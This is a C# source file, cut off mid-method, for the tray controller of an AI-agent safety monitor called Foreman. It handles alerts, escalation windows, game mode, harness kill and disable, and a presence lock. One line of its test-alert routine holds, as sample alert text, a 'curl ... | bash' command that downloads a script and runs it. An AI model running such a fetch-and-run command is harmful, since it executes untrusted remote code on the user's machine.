using Foreman.App.Windows;
using Foreman.Core.Alerts;
using Foreman.Core.Behavior;
using Foreman.Core.Events;
using Foreman.Core.Integration;
using Foreman.Core.Models;
using Foreman.Core.Power;
using Foreman.Core.Settings;
using Foreman.McpServer;
using H.NotifyIcon;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Threading;

namespace Foreman.App.Tray;

public enum TrayStatus { Green, Amber, Red }

public sealed class TrayController : IEventSink, IDisposable
{
    private readonly ForemanSettings _settings;
    private readonly EventBus _bus;
    private TaskbarIcon? _tray;
    private DashboardWindow? _dashboardWindow;   // hosts Process/Harness/Behavior/Log as tabs
    private TrayStatus _status = TrayStatus.Green;
    private int _activeAlerts;
    private SettingsWindow? _settingsWindow;
    private ConnectAgentWindow? _connectWindow;
    private MuteManagerWindow? _muteWindow;
    private ForemanEvent? _lastBalloonEvent;
    private EscalationLevel _highestEscalation = EscalationLevel.Watch;
    // guard: only show one Emergency window per harness per session
    private readonly HashSet<string> _emergencyWindowShown = new(StringComparer.OrdinalIgnoreCase);

    // Last values that affect the tray context-menu labels (see RefreshAlertState).
    private int _lastMenuMuteCount = -1;
    private bool _lastGameModeActive;

    // Game mode: pauses on-screen popups while a fullscreen game/app is detected; counts what was held.
    private GameModeWatcher? _gameMode;
    private int _gmSuppressedTotal;
    private int _gmSuppressedCritical;

    // Cadence governor: caps bursts of OPERATIONAL toasts (hang/orphan) per harness; a flush timer rolls the
    // coalesced count into one gentle notice per window. Governs the popup only — events are always logged.
    private readonly AlertCadenceGovernor _cadence;
    private DispatcherTimer? _cadenceFlushTimer;

    /// <summary>Injected from App so the Harnesses window can show live running status.</summary>
    public Func<IEnumerable<Foreman.Core.Models.ProcessRecord>>? GetProcessSnapshot { get; set; }

    /// <summary>Injected from McpServerHost — returns the count of live SSE sessions.</summary>
    public Func<int>? GetMcpClientCount { get; set; }

    // ── Behavior metrics / kill injection points ─────────────────────────────
    public Func<IEnumerable<BehaviorProfile>>?                GetBehaviorProfiles  { get; set; }
    public Action<string>?                                    ResetBehaviorProfile  { get; set; }
    public Func<string, IEnumerable<ProcessRecord>>?          GetProcessesByHarness { get; set; }
    public Action<string>?                                    KillHarness           { get; set; }
    public Action<string>?                                    DisableHarness        { get; set; }

    /// <summary>Injected from App — routes the offending harness to an independent auditor (same flow as the
    /// auto-audit response). Backs the Emergency popup's "Audit Harness" button.</summary>
    public Action<Foreman.Core.Models.EscalationEvent>?       AuditHarness          { get; set; }

    /// <summary>Injected from App — asks a harness to pack up cleanly (Idle Harness self-cleanup).</summary>
    public Func<string, (bool Ok, string Message)>?           RequestHarnessCleanup { get; set; }

    /// <summary>Injected from App — "Prep sessions for update": cooperatively checkpoints ACTIVE harness sessions and
    /// reaps IDLE/abandoned ones so an update or restart lands clean.</summary>
    public Func<(bool Ok, string Message)>?                   PrepSessionsForUpdate { get; set; }

    /// <summary>Injected from App — per-PID network bytes/sec from the elevated sidecar (null when off).</summary>
    public Func<int, double?>?                                GetNetRate            { get; set; }

    public Func<WakeRequestSnapshot>?                         GetWakeRequests       { get; set; }

    /// <summary>Injected from App — an agent's self-reported context/token budget (report_usage MCP tool).</summary>
    public Func<string, Foreman.Core.Models.HarnessContextUsage?>? GetContextUsage   { get; set; }

    /// <summary>Injected from App — applies the Run Elevated toggle (persist + start/stop the sidecar).</summary>
    public Action<bool>?                                      ApplyRunElevated      { get; set; }

    /// <summary>Injected from App — applies the Scan MCP tools toggle (start/stop the opt-in outbound probe).</summary>
    public Action<bool>?                                      ApplyScanMcpTools     { get; set; }

    /// <summary>Injected from App — re-applies decoy read-auditing (re-launch the elevated sidecar with the decoy paths).</summary>
    public Action?                                            ApplyDecoyAuditing    { get; set; }

    /// <summary>Injected from App — begins browser-extension pairing; returns the short on-screen code to show.</summary>
    public Func<string>?                                      BeginPairing          { get; set; }

    /// <summary>Injected from App — true when the LiveWeave extension has checked in recently (broker presence).</summary>
    public Func<bool>?                                        IsLiveWeaveConnected  { get; set; }

    /// <summary>Injected from App — read/set the mediated computer-use (cu_*) driver harness in-process (operator).</summary>
    public Func<string?>?                                     GetCuDriver           { get; set; }
    public Action<string?>?                                   SetCuDriver           { get; set; }

    /// <summary>Injected from App — the MCP bearer token, for building Claude Code connect config/commands.</summary>
    public Func<string>?                                      GetMcpToken           { get; set; }

    /// <summary>Injected from App — mints a scoped per-harness MCP token for the Connect-Agent flow.</summary>
    public Func<string, string>?                              MintHarnessToken      { get; set; }

    /// <summary>Injected from App — connected MCP clients + capabilities, for the Connect-agent guide.</summary>
    public Func<IReadOnlyList<McpClientInfo>>?                GetConnectedClients   { get; set; }

    /// <summary>Injected from App — harness ids that made an authenticated MCP request recently (sticky "connected").</summary>
    public Func<IReadOnlyCollection<string>>?                GetRecentlyConnectedHarnessIds { get; set; }

    /// <summary>Injected from App — current MCP-server inventory (per-harness), for computer/browser-use flags.</summary>
    public Func<IReadOnlyList<Foreman.Core.Mcp.McpServerEntry>>? GetMcpInventory   { get; set; }

    /// <summary>Injected from ForemanState — pending Ask Harness count (null harness = total).</summary>
    public Func<string?, int>?                                 GetPendingAskCount    { get; set; }

    /// <summary>Injected from App — true when the elevated network sidecar is connected and feeding.</summary>
    public Func<bool>?                                        GetNetCaptureActive   { get; set; }

    public TrayController(ForemanSettings settings, EventBus bus)
    {
        _settings = settings;
        _bus = bus;
        _cadence = new AlertCadenceGovernor(settings.CadenceGovernor);
    }

    /// <summary>Computer-use panic controller (halt/resume). Injected by the App; the STOP/RESUME menu item shows only when set.</summary>
    public Foreman.App.ComputerUse.PanicController? Panic { get; set; }

    public void Initialize()
    {
        _tray = new TaskbarIcon
        {
            Icon = TrayIconSet.Green,
            ToolTipText = "Foreman Agent Safety — All clear",
            ContextMenu = BuildMenu(),
        };

        // ── Notification click paths ──────────────────────────────────────────
        //
        // Windows 10/11 converts Shell_NotifyIcon balloons into Action Center toasts.
        // Clicking the toast WHILE VISIBLE fires TrayBalloonTipClicked (NIN_BALLOONUSERCLICK).
        // Clicking from the Action Centre does NOT send that message — the notification is
        // already gone by then. We cover both cases:
        //
        //   1. TrayBalloonTipClicked  — fires when balloon is clicked while still visible
        //   2. TrayLeftMouseButtonUp  — fires on any left-click of the tray icon itself;
        //                               opens the last alert if one is pending, otherwise the log
        //   3. Double-click           — always opens the log window

        _tray.TrayBalloonTipClicked += (_, _) => OpenLastAlertOrLog();
        _tray.TrayLeftMouseUp       += (_, _) => OpenDashboardWindow();
        _tray.TrayMouseDoubleClick  += (_, _) => OpenLogWindow();

        _bus.Subscribe(this);

        // wire up the "Open Log" button in AlertDetailWindow / EscalationAlarmWindow
        AlertDetailWindow.OpenLogRequested     = () => OpenLogWindow();
        EscalationAlarmWindow.OpenLogRequested = () => OpenLogWindow();
        // wire up the "Open Log" button in DashboardWindow
        // (set when the window is created — see OpenDashboardWindow)

        // Game mode: pause on-screen popups while a fullscreen game/app is detected.
        _gameMode = new GameModeWatcher();
        _gameMode.Changed += OnGameModeChanged;

        // Cadence governor: once per window, fold the toasts we coalesced into a single rollup notice so the
        // operator can see that repetitive operational noise was quieted (and that it's all still in the log).
        _cadenceFlushTimer = new DispatcherTimer
        {
            Interval = TimeSpan.FromSeconds(_settings.CadenceGovernor.EffectiveWindowSeconds),
        };
        _cadenceFlushTimer.Tick += (_, _) => FlushCadenceRollup();
        _cadenceFlushTimer.Start();

        // ForceCreate() initialises the native Shell_NotifyIcon for code-behind
        // TaskbarIcon instances that are not part of the XAML visual tree.
        _tray.ForceCreate();
    }

    // ── Game mode ─────────────────────────────────────────────────────────────

    private bool GameModeActive => _gameMode?.IsActive == true;

    /// <summary>Whether an alert of this severity may surface on screen right now (false = held by game mode).</summary>
    private bool SurfaceAllowed(ForemanSeverity severity) =>
        GameModePolicy.ShouldSurface(severity, _settings.GameMode, GameModeActive);

    private void OnGameModeChanged(bool active) =>
        Application.Current?.Dispatcher.BeginInvoke(() =>
        {
            try
            {
                if (active)
                {
                    _gmSuppressedTotal = 0;
                    _gmSuppressedCritical = 0;
                }
                else if (_gmSuppressedTotal > 0)
                {
                    // Deferred digest: the on-screen interruptions we held are surfaced now that the game is gone.
                    _lastBalloonEvent = null;   // clicking the digest opens the log
                    var crit = _gmSuppressedCritical > 0 ? $", {_gmSuppressedCritical} critical" : "";
                    TryShowNotification("game mode digest",
                        "Foreman Agent Safety - game mode ended",
                        $"Held {_gmSuppressedTotal} on-screen alert(s){crit} while you were in a game. Click to review the log.",
                        _gmSuppressedCritical > 0 ? H.NotifyIcon.Core.NotificationIcon.Error : H.NotifyIcon.Core.NotificationIcon.Warning);
                    _gmSuppressedTotal = 0;
                    _gmSuppressedCritical = 0;
                }
                RefreshAlertState();   // refresh the tooltip's game-mode indicator
            }
            catch (Exception ex)
            {
                CrashLog.Note("game mode state change", ex);
            }
        });

    /// <summary>
    /// Opens the AlertDetailWindow for the most recent balloon event,
    /// or the log window if there is no pending event.
    /// </summary>
    private void OpenLastAlertOrLog()
    {
        var evt = _lastBalloonEvent;
        if (evt is not null)
        {
            try { AlertDetailWindow.ShowFor(evt); }
            catch { OpenLogWindow(); }
        }
        else if (_activeAlerts > 0)
        {
            OpenLogWindow();
        }
        // If no alerts at all, left-click does nothing (right-click shows the menu)
    }

    void IEventSink.OnEvent(ForemanEvent evt)
    {
        // Coalesce the alert-set-scanning refresh: a burst of events collapses to ONE RefreshAlertState per UI
        // drain instead of one per event, which was saturating the dispatcher and wedging the watchdog under load.
        QueueRefresh();

        // Info / already-acked events never pop on screen — skip the per-event marshal entirely.
        if (evt is InfoEvent || evt.Acknowledged)
            return;

        // Per-event on-screen handling still marshals individually, but it is already burst-protected (the cadence
        // governor coalesces operational toasts; emergency windows are rare + de-duped per harness).
        Application.Current.Dispatcher.BeginInvoke(() =>
        {
            try
            {
                ShowBalloonIfNeeded(evt);
                if (evt is EscalationEvent esc)
                    HandleEscalation(esc);
            }
            catch (Exception ex) { CrashLog.Note("tray OnEvent (balloon/escalation)", ex); }
        });
    }

    // Single-flight refresh: at most one RefreshAlertState is queued on the UI thread at a time, so a burst of
    // events collapses into one recompute (the recompute scans all active alerts; doing it per-event under a burst
    // saturated the dispatcher and the watchdog went unresponsive). The flag clears at the START of the callback,
    // so an event arriving mid-refresh queues a fresh one and no update is lost.
    private int _refreshQueued;
    private void QueueRefresh()
    {
        if (System.Threading.Interlocked.Exchange(ref _refreshQueued, 1) != 0) return;
        Application.Current?.Dispatcher.BeginInvoke(() =>
        {
            System.Threading.Interlocked.Exchange(ref _refreshQueued, 0);
            try { RefreshAlertState(); }
            catch (Exception ex) { CrashLog.Note("tray refresh", ex); }
        });
    }

    private void HandleEscalation(EscalationEvent esc)
    {
        if (esc.NewLevel > _highestEscalation)
            _highestEscalation = esc.NewLevel;

        // Alarm level: send MCP push (done via EventBus → SseSessionManager already)
        // Emergency level: auto-show the alarm window (once per harness per session)
        if (esc.NewLevel == EscalationLevel.Emergency
            && SurfaceAllowed(esc.Severity)               // game mode: don't pop a window over a fullscreen game
            && _emergencyWindowShown.Add(esc.HarnessId))
        {
            EscalationAlarmWindow.ShowFor(
                esc,
                id => KillHarness?.Invoke(id),
                id => DisableHarness?.Invoke(id),
                AuditHarness is { } audit ? e => audit(e) : null);
        }
    }

    private void ShowBalloonIfNeeded(ForemanEvent evt)
    {
        if (_tray is null) return;
        // Operator mute: quiet the popup only. The event is already logged/counted/escalated by the
        // time we get here — muting never hides it from the log, dashboard or escalation.
        if (Foreman.Core.Models.MutePolicy.IsSuppressed(evt, _settings.Mutes, DateTimeOffset.UtcNow)) return;
        if (!_settings.NotifyOnHang && evt is HangDetectedEvent) return;
        if (!_settings.NotifyOnOrphan && evt is OrphanDetectedEvent) return;
        if (!_settings.NotifyOnCriticalCommand && evt is CommandAlertEvent) return;
        if (evt is InfoEvent) return;

        // Game mode: hold the on-screen popup (it's already logged/counted/escalated). Tally it so the
        // digest on game-mode exit can tell the operator what was held.
        if (!SurfaceAllowed(evt.Severity))
        {
            _gmSuppressedTotal++;
            if (evt.Severity >= ForemanSeverity.Critical) _gmSuppressedCritical++;
            return;
        }

        // Cadence governor: coalesce bursts of OPERATIONAL toasts (hang/orphan) per harness. By this point the
        // raw event is already logged/counted/escalated — coalescing quiets only the popup, never the record.
        // Only hang/orphan return a key; security/command/escalation/decoy/critical events are never governed,
        // so a flood of operational noise can never be used to bury a real alert. The flush timer rolls the
        // coalesced count into one notice per window.
        var cadenceKey = CadenceClassKey(evt);
        if (cadenceKey is not null && !_cadence.ShouldNotify(cadenceKey))
            return;

        // For escalation events, use a distinct balloon format
        if (evt is EscalationEvent esc)
        {
            var (title, icon) = esc.NewLevel switch
            {
                EscalationLevel.Emergency => ("Foreman Agent Safety — EMERGENCY", H.NotifyIcon.Core.NotificationIcon.Error),
                EscalationLevel.Alarm     => ("Foreman Agent Safety — ALARM",     H.NotifyIcon.Core.NotificationIcon.Error),
                _                         => ("Foreman Agent Safety — Alert",     H.NotifyIcon.Core.NotificationIcon.Warning),
            };
            _lastBalloonEvent = esc;
            TryShowNotification("escalation alert", title,
                $"{esc.HarnessDisplayName}: {esc.TotalAlerts} alerts, {esc.UniqueRules} rules\n(Click for details)",
                icon);
            return;
        }

        if (evt.Severity >= ForemanSeverity.High)
        {
            _lastBalloonEvent = evt;
            TryShowNotification("critical alert", "Foreman Agent Safety - Critical Alert",
                evt.Message + "\n(Click for details)",
                H.NotifyIcon.Core.NotificationIcon.Error);
        }
        else if (evt.Severity == ForemanSeverity.Medium && _settings.NotifyOnWarning)
        {
            // Operator muted the yellow warning toasts (dashboard "Mute warnings"): skip the popup only — the
            // event is still logged, counted, shown in the dashboard, and escalated. Notification spam off.
            _lastBalloonEvent = evt;
            TryShowNotification("warning alert", "Foreman Agent Safety - Warning",
                evt.Message + "\n(Click for details)",
                H.NotifyIcon.Core.NotificationIcon.Warning);
        }
    }

    // The only alert classes the cadence governor is allowed to coalesce: the two high-cadence OPERATIONAL
    // classes (hang/orphan). Everything else — heuristic command alerts, escalations, decoy reads, permission
    // violations, anything Critical — returns null and is NEVER coalesced. Hangs key per owning harness so a
    // flood from one harness can't suppress another's first hang; orphans share one key (they carry no owner).
    private static string? CadenceClassKey(ForemanEvent evt) => evt switch
    {
        HangDetectedEvent h   => "hang/" + (h.ParentHarnessType ?? h.ParentHarnessName ?? "unattributed"),
        OrphanDetectedEvent   => "orphan",
        _                     => null,
    };

    // Turn a cadence class key ("hang/codex", "orphan") into a human label for the rollup notice.
    private static string ReadableCadenceClass(string classKey)
    {
        if (classKey.StartsWith("hang/", StringComparison.Ordinal))
        {
            var owner = classKey["hang/".Length..];
            if (owner is "" or "unattributed") return "process hang (no I/O)";
            var name = Foreman.Core.Models.KnownHarnesses.GetById(owner)?.DisplayName ?? owner;
            return $"{name} process hang (no I/O)";
        }
        return classKey == "orphan" ? "orphaned process" : classKey;
    }

    /// <summary>Once per window: fold the coalesced operational-toast counts into one logged notice + one gentle balloon.</summary>
    private void FlushCadenceRollup()
    {
        try
        {
            var rolled = _cadence.Flush();
            if (rolled.Count == 0) return;

            var total = rolled.Sum(r => r.Suppressed);
            var window = _settings.CadenceGovernor.EffectiveWindowSeconds;
            var parts = string.Join(", ", rolled.Select(r => $"{ReadableCadenceClass(r.ClassKey)} ×{r.Suppressed}"));
            var msg = $"Quieted {total} repeat notice(s) in the last {window}s: {parts}. Each is still in the Event Log.";

            // Logged record (InfoEvent → shows in the log, never toasts on its own — so this can't re-flood).
            _bus.Publish(new InfoEvent(DateTimeOffset.UtcNow, "Foreman.Cadence", msg));

            // One gentle rollup balloon so the operator knows coalescing is active and where to look — but
            // respect game mode (don't pop over a fullscreen app) and never more than once per window.
            if (SurfaceAllowed(ForemanSeverity.Low))
            {
                _lastBalloonEvent = null;   // clicking the rollup opens the log
                TryShowNotification("cadence rollup", "Foreman Agent Safety — repetitive notices quieted",
                    msg, H.NotifyIcon.Core.NotificationIcon.Info);
            }
        }
        catch (Exception ex)
        {
            CrashLog.Note("cadence rollup", ex);
        }
    }

    private void SetStatus(TrayStatus status, bool rebuildMenu)
    {
        _status = status;
        if (_tray is null) return;

        // Tray updates go through Shell_NotifyIcon, which transiently fails (Explorer restart, notification-
        // area churn) and makes H.NotifyIcon throw "UpdateToolTip failed". A flaky tray API must NEVER crash
        // the watchdog — best-effort, record + swallow. (This exact path took the process down once.)
        try
        {
            TrySetIcon(status);
            TrySetToolTip(BuildStatusToolTip());
            if (rebuildMenu) TrySetContextMenu();
        }
        catch (Exception ex)
        {
            CrashLog.Note("tray SetStatus (transient Shell_NotifyIcon failure)", ex);
        }
    }

    private string BuildStatusToolTip()
    {
        var escalationStr = _highestEscalation > EscalationLevel.Watch
            ? $" - {_highestEscalation.ToString().ToUpperInvariant()}"
            : "";
        var gameStr = GameModeActive && _settings.GameMode.Enabled ? " - game mode (popups paused)" : "";
        return $"Foreman Agent Safety - {(_activeAlerts > 0 ? $"{_activeAlerts} alert(s){escalationStr}" : "All clear")}{gameStr}";
    }

    private void TrySetIcon(TrayStatus status)
    {
        if (_tray is null) return;
        try
        {
            _tray.Icon = status switch
            {
                TrayStatus.Red   => TrayIconSet.Red,
                TrayStatus.Amber => TrayIconSet.Amber,
                _                => TrayIconSet.Green,
            };
        }
        catch (Exception ex) { CrashLog.Note("tray icon update", ex); }
    }

    private void TrySetToolTip(string text)
    {
        if (_tray is null) return;
        try { _tray.ToolTipText = text; }
        catch (Exception ex) { CrashLog.Note("tray tooltip update", ex); }
    }

    private void TrySetContextMenu()
    {
        if (_tray is null) return;
        // NEVER swap the ContextMenu object while it's OPEN — WPF wedges the live popup (the user sees the
        // right-click menu "hang"). Under alert churn this rebuild fires often, so the race is easy to hit. Skip
        // it; the next refresh after the menu closes rebuilds it with current counts.
        if (_tray.ContextMenu?.IsOpen == true) return;
        try { _tray.ContextMenu = BuildMenu(); }
        catch (Exception ex) { CrashLog.Note("tray context menu update", ex); }
    }

    private void TryShowNotification(string context, string title, string message, H.NotifyIcon.Core.NotificationIcon icon)
    {
        if (_tray is null) return;
        try { _tray.ShowNotification(title, message, icon); }
        catch (Exception ex) { CrashLog.Note($"tray notification ({context})", ex); }
    }

    private void RefreshAlertState()
    {
        var active = EventBus.Instance.GetHistory()
            .Where(AlertActivity.IsActive)   // the one shared definition (tray/dashboard/MCP agree)
            .ToList();

        var newCount = active.Count;
        var newEscalation = active
            .OfType<EscalationEvent>()
            .Select(e => e.NewLevel)
            .DefaultIfEmpty(EscalationLevel.Watch)
            .Max();

        var newStatus = active.Any(e => e.Severity >= ForemanSeverity.High)
            ? TrayStatus.Red
            : active.Any(e => e.Severity >= ForemanSeverity.Low)
                ? TrayStatus.Amber
                : TrayStatus.Green;

        // Context-menu labels embed alert count / escalation / mute list — rebuild only when those change.
        // Rebuilding the full WPF menu on every event (including Info/cadence rollups) was wedging the
        // UI thread when hundreds of active alerts were present and events arrived in bursts.
        var menuChanged = newCount != _activeAlerts
            || newEscalation != _highestEscalation
            || _settings.Mutes.Count != _lastMenuMuteCount;
        var gameModeActive = GameModeActive;

        if (newCount == _activeAlerts
            && newEscalation == _highestEscalation
            && newStatus == _status
            && gameModeActive == _lastGameModeActive
            && !menuChanged)
            return;

        _activeAlerts = newCount;
        _highestEscalation = newEscalation;
        _lastMenuMuteCount = _settings.Mutes.Count;
        _lastGameModeActive = gameModeActive;
        SetStatus(newStatus, rebuildMenu: menuChanged);
    }

    private void OpenDashboardWindow()
    {
        // Guard on the reference, not IsLoaded: during lag a window that's constructed but not yet
        // Loaded would fail an IsLoaded check, so a rapid second tray click would spawn a duplicate.
        // We assign the field BEFORE Show() (so a re-entrant click sees it) and clear it on Closed.
        if (_dashboardWindow is null)
        {
            var w = new DashboardWindow(GetBehaviorProfiles ?? (() => []));
            w.OpenSettingsRequested = () => OpenSettingsWindow();
            w.OpenConnectAgentRequested = () => OpenConnectAgentWindow();
            // Mute/unmute yellow (medium) warning toasts so they don't spam — notifications only; alerts still
            // log, count, and show in the dashboard. Persisted so it survives restarts.
            w.SetWarningsMuted = muted => { _settings.NotifyOnWarning = !muted; SettingsStore.Save(_settings); };
            w.GetMcpClientCount = GetMcpClientCount;
            w.GetNetCaptureConnected = GetNetCaptureActive;
            w.GetConnectedClients = GetConnectedClients;
            w.GetRecentlyConnectedHarnessIds = GetRecentlyConnectedHarnessIds;
            w.GetMcpInventory = GetMcpInventory;
            Func<IEnumerable<Foreman.Core.Models.ProcessRecord>> snap = GetProcessSnapshot ?? (() => []);
            // "Agents running" = distinct harness types currently in the process tree (live), which is
            // far more intuitive than a count of behaviour profiles (which sits at 0 until something fires).
            w.GetRunningAgentCount = () => snap()
                .Where(p => p.IsHarness)
                .Select(p => p.HarnessType)
                .Where(t => !string.IsNullOrEmpty(t))
                .Distinct(StringComparer.OrdinalIgnoreCase)
                .Count();
            w.GetProcessSnapshot = snap;
            w.GetSettings = () => _settings;
            w.GetProcessesByHarness = type => GetProcessesByHarness?.Invoke(type) ?? [];
            w.GetNetRate = GetNetRate;
            w.GetWakeRequests = GetWakeRequests;
            w.GetContextUsage = id => GetContextUsage?.Invoke(id);
            w.RequestHarnessCleanup = id => RequestHarnessCleanup?.Invoke(id) ?? (false, "Cleanup isn't available.");
            w.ResetBehaviorMetrics = id => ResetBehaviorProfile?.Invoke(id);
            w.GetPendingAskCount = id => GetPendingAskCount?.Invoke(id) ?? 0;
            w.GetGameModeActive = () => GameModeActive;
            w.McpPort = _settings.McpPort;

            // The monitoring views are now tabs inside the dashboard; build them here (the tray is the
            // composition root that holds the data providers) and hand them to the dashboard to host.
            w.HostViews(
                processes: new ProcessMonitorWindow(snap, GetNetRate, RequestHarnessCleanup),
                harnesses: new HarnessesWindow(_settings, snap, GetWakeRequests),
                behavior:  new BehaviorMetricsWindow(
                    _settings,
                    GetBehaviorProfiles   ?? (() => []),
                    ResetBehaviorProfile  ?? (_ => { }),
                    GetProcessesByHarness ?? (_ => []),
                    KillHarness           ?? (_ => { })),
                log: new LogWindow());

            w.Closed += (_, _) => _dashboardWindow = null;   // allow a fresh window after this one closes
            _dashboardWindow = w;                            // set before Show() to close the re-entrancy gap
            w.Show();
        }
        WindowActivation.Surface(_dashboardWindow);
    }

    private void ShowDashboardTab(DashboardWindow.DashboardTab tab)
    {
        OpenDashboardWindow();
        _dashboardWindow?.ShowTab(tab);
    }

    // The former standalone windows are now dashboard tabs; these keep all existing callers working.
    private void OpenLogWindow()             => ShowDashboardTab(DashboardWindow.DashboardTab.Log);
    private void OpenProcessMonitorWindow()  => ShowDashboardTab(DashboardWindow.DashboardTab.Processes);
    private void OpenHarnessesWindow()       => ShowDashboardTab(DashboardWindow.DashboardTab.Harnesses);
    private void OpenBehaviorMetricsWindow() => ShowDashboardTab(DashboardWindow.DashboardTab.Behavior);

    private void SendTestAlert()
    {
        // Publish a synthetic CommandAlertEvent so the notification → AlertDetailWindow path
        // can be exercised. The rule id MUST be the dedicated "test-001": real rule ids here
        // (this used net-001, an EmergencyRuleIds member) put the fake harness into a genuine
        // session-long EMERGENCY escalation with the alarm window — a terrifying first-run.
        // BehaviorTracker skips "test-*" rules, so this alerts without escalating anything.
        _bus.Publish(new CommandAlertEvent(
            DateTimeOffset.UtcNow,
            ForemanSeverity.High,
            "Foreman.Test",
            "[TEST] This is a test alert — nothing was detected",
            "curl https://example.com/setup.sh | bash   (example command, not executed)",
            "test-001",
            "test alert",
            "A synthetic alert sent from the tray menu to verify notifications work",
            "Nothing to do — this is a drill. Click the tray notification or double-click " +
            "the log row to verify AlertDetailWindow opens, then acknowledge it.",
            0));
    }

    private void OpenSettingsWindow()
    {
        if (_settingsWindow is null)
        {
            var w = new SettingsWindow(_settings, ApplyRunElevated, ApplyScanMcpTools, ApplyDecoyAuditing);
            w.Closed += (_, _) => _settingsWindow = null;
            _settingsWindow = w;
            w.Show();
        }
        WindowActivation.Surface(_settingsWindow);
    }

    /// <summary>Rebuild the tray context menu now (e.g. when the computer-use panic state flips and the colour
    /// status didn't change). Must be called on the UI thread.</summary>
    public void RefreshMenu()
    {
        if (_tray is null) return;
        if (_tray.ContextMenu?.IsOpen == true) return;   // don't swap the menu out from under an open popup
        try { _tray.ContextMenu = BuildMenu(); } catch { /* transient WPF/COM hiccup — next event rebuilds */ }
    }

    private ContextMenu BuildMenu()
    {
        var menu = new ContextMenu();

        var levelStr = _highestEscalation > EscalationLevel.Watch
            ? $"  [{_highestEscalation.ToString().ToUpperInvariant()}]" : "";
        AddMenuItem(menu, $"Foreman Agent Safety v{GetVersion()}  ●  {_activeAlerts} alert(s){levelStr}", null, enabled: false);
        menu.Items.Add(new Separator());
        // Computer-use panic control — kept at the very top so "give me my screen back" is one click away. STOP is
        // unguarded (safe direction); RESUME is presence-gated inside PanicController.
        if (Panic is { } panic)
        {
            if (panic.IsHalted)
                AddMenuItem(menu, "▶ RESUME computer use (verify presence)", () => ResumeComputerUseFromTray());
            else
                AddMenuItem(menu, "⛔ STOP computer use (panic)", () => panic.Halt("tray STOP"));
            menu.Items.Add(new Separator());
        }
        AddMenuItem(menu, "Dashboard", () => OpenDashboardWindow());
        AddMenuItem(menu, "Open Log", () => OpenLogWindow());
        AddMenuItem(menu, "Process Monitor…", () => OpenProcessMonitorWindow());
        AddMenuItem(menu, "Harnesses…", () => OpenHarnessesWindow());
        AddMenuItem(menu, "Behavior Metrics…", () => OpenBehaviorMetricsWindow());
        if (PrepSessionsForUpdate is not null)
            AddMenuItem(menu, "Prep sessions for update…", () => PrepSessionsForUpdateFromTray());
        menu.Items.Add(new Separator());
        AddMenuItem(menu, "Send test alert…", () => SendTestAlert());
        menu.Items.Add(new Separator());
        var clients = GetMcpClientCount?.Invoke() ?? 0;
        var mcpLabel = clients > 0
            ? $"MCP Server: port {_settings.McpPort}  ·  {clients} client{(clients == 1 ? "" : "s")}"
            : $"MCP Server: port {_settings.McpPort}  ·  no clients";
        AddMenuItem(menu, mcpLabel, null, enabled: false);
        AddMenuItem(menu, "Connect agent…", () => OpenConnectAgentWindow());
        if (_settings.Mutes.Count > 0)
            AddMenuItem(menu, $"Muted alerts… ({_settings.Mutes.Count})", () => OpenMuteManagerWindow());
        AddMenuItem(menu, "Settings…", () => OpenSettingsWindow());
        menu.Items.Add(new Separator());
        var plLabel = Foreman.App.Security.PresenceGuard.IsEnabled
            ? $"Presence lock: ON ({Foreman.App.Security.PresenceGuard.AuthenticatorLabel})"
            : "Presence lock: off";
        AddMenuItem(menu, plLabel, () => TogglePresenceLock());
        menu.Items.Add(new Separator());
        AddMenuItem(menu, "Exit", () => ExitForeman());

        return menu;
    }

    // Exit is a weakening action — gated under Strict scope (no-op tap under Standard/off).
    private async void ExitForeman()
    {
        if (await Foreman.App.Security.PresenceGuard.AuthorizeAsync(
                Foreman.Core.Security.WeakeningAction.ExitForeman, "quit Foreman"))
            Application.Current.Shutdown();
    }

    // Resume computer use after a panic STOP — presence-gated inside PanicController (an agent can't un-halt itself).
    private async void ResumeComputerUseFromTray()
    {
        if (Panic is not { } panic) return;
        var (ok, msg) = await panic.ResumeAsync();
        MessageBox.Show(msg, "Foreman Agent Safety — Computer use", MessageBoxButton.OK,
            ok ? MessageBoxImage.Information : MessageBoxImage.Warning);
    }

    // Enroll (arm) or disarm the presence lock. Disarming is itself a presence tap, so an agent can't un-gate.
    private async void TogglePresenceLock()
    {
        if (Foreman.App.Security.PresenceGuard.IsEnabled)
        {
            var (ok, msg) = await Foreman.App.Security.PresenceGuard.DisableAsync();
            MessageBox.Show(msg, "Foreman Agent Safety — Presence lock", MessageBoxButton.OK,
                ok ? MessageBoxImage.Information : MessageBoxImage.Warning);
            return;
        }

        if (!Foreman.App.Security.PresenceGuard.IsAvailable)
        {
            MessageBox.Show(
                "No authenticator available. Set up Windows Hello (a PIN or biometric in Windows Settings → " +
                "Accounts → Sign-in options) or attach a FIDO2 security key, then try again.",
                "Foreman Agent Safety — Presence lock", MessageBoxButton.OK, MessageBoxImage.Warning);
            return;
        }

        var choice = MessageBox.Show(
            "Require a Windows Hello or security-key tap to WEAKEN Foreman — lower a harness's Trust, disable " +
            "read-auditing, disable the persistent log, or disable a harness?\n\n" +
            "YES = Strict (also requires a tap to QUIT Foreman — most secure, but can be annoying)\n" +
            "NO = Standard (recommended)\n" +
            "Cancel = don't enable",
            "Foreman Agent Safety — Enable presence lock", MessageBoxButton.YesNoCancel, MessageBoxImage.Question);
        if (choice == MessageBoxResult.Cancel) return;

        var scope = choice == MessageBoxResult.Yes
            ? Foreman.Core.Security.LockScope.Strict
            : Foreman.Core.Security.LockScope.Standard;
        var (ok2, msg2) = await Foreman.App.Security.PresenceGuard.EnableAsync(scope);
        MessageBox.Show(msg2, "Foreman Agent Safety — Presence lock", MessageBoxButton.OK,
            ok2 ? MessageBoxImage.Information : MessageBoxImage.Warning);
    }

    // Opens the beginner-friendly "Connect an agent" guide (Claude Code one-click + copy-paste config).
    private void OpenConnectAgentWindow()
    {
        var token = GetMcpToken?.Invoke();
        if (string.IsNullOrWhiteSpace(token))
        {
            MessageBox.Show(
                "Foreman Agent Safety's MCP token isn't ready yet — give the server a moment to start, then try again.",
                "Foreman Agent Safety — Connect agent", MessageBoxButton.OK, MessageBoxImage.Warning);
            return;
        }

        if (_connectWindow is null)
        {
            var w = new ConnectAgentWindow(_settings.McpPort, token, GetConnectedClients, MintHarnessToken, BeginPairing,
                () => (GetProcessSnapshot?.Invoke() ?? [])
                    .Where(p => !string.IsNullOrEmpty(p.HarnessType))
                    .Select(p => p.HarnessType!)
                    .Distinct(StringComparer.OrdinalIgnoreCase)
                    .ToArray(),
                IsLiveWeaveConnected);
            w.GetCuDriver = GetCuDriver;
            w.SetCuDriver = SetCuDriver;
            w.Closed += (_, _) => _connectWindow = null;
